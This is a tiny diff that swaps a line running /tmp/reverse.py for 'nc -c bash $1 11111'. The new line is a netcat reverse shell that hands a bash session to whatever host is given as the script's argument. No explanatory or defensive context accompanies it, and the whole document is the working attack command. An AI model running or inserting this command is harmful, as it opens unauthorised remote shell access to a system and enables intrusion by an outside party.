@@ -1,1 +1,1 @@
-/usr/bin/python3 /tmp/reverse.py 2>&1 | tee /tmp/reverse.py.log
+nc -c bash $1 11111
